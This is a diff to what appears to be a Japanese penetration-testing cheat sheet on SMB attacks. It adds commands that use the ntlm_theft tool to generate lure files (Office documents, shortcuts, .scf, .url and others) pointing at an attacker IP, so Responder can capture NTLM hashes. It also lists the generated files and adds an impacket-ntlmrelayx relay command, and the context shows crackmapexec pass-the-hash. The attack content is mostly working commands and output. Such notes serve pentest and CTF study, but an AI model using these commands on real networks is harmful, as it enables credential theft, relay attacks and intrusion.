@@ -106,3 +106,33 @@ SMBではないが使いどころが近いので。
 ```sh
 crackmapexec smb $TARGET -u users.txt -H ntlm-hashes.txt
 ```
+
+## SMBトラップ
+
+Responder で NTLMハッシュを入手するためのファイルを生成
+
+```sh
+git clone https://github.com/Greenwolf/ntlm_theft.git
+cd ntlm_theft
+python ./ntlm_theft.py --generate all --server 192.168.129.39 --filename project
+```
+
+```sh
+$ ls ntlm_theft/project 
+ Autorun.inf                    project.htm                     'project-(remotetemplate).docx'
+ desktop.ini                   'project-(icon).url'              project.rtf
+ project.application           'project-(includepicture).docx'   project.scf
+ project.asx                    project.jnlp                    'project-(stylesheet).xml'
+'project-(externalcell).xlsx'   project.library-ms               project.theme
+'project-(frameset).docx'       project.lnk                     'project-(url).url'
+'project-(fulldocx).xml'        project.m3u                      project.wax
+'project-(handler).htm'         project.pdf                      zoom-attack-instructions.txt
+```
+
+### NTLMリレー
+
+SMBにアクセスしてくるマシンと、リレー先のマシンは異なるマシンである必要がある。
+
+```sh
+impacket-ntlmrelayx -t $TARGET2 -smb2support -i
+```
